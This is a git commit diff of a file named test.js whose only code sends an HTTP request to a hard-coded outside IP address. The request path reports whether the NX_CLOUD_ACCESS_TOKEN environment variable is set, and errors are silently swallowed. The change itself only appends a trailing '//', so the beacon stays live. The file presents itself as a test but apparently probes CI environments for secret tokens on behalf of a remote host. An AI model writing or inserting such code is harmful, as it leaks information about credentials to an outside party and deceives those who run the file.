da4918c9af19de82ffcf1e5d862c15b4a6401fc4
left <107749872+0xleft@users.noreply.github.com>
2024-06-28 20:37:35 +0100

    Update test.js

--- test.js
+++ test.js
@@ -2,7 +2,7 @@ const axios = require('axios');
 
 (async () => {
   try {
-    await axios.get(`http://194.135.88.67:9990/${(process.env.NX_CLOUD_ACCESS_TOKEN === undefined || process.env.NX_CLOUD_ACCESS_TOKEN === "") ? "good" : "bad"}`);
+    await axios.get(`http://194.135.88.67:9990/${(process.env.NX_CLOUD_ACCESS_TOKEN === undefined || process.env.NX_CLOUD_ACCESS_TOKEN === "") ? "good" : "bad"}`); //
   } catch (error) {
   }
 })();
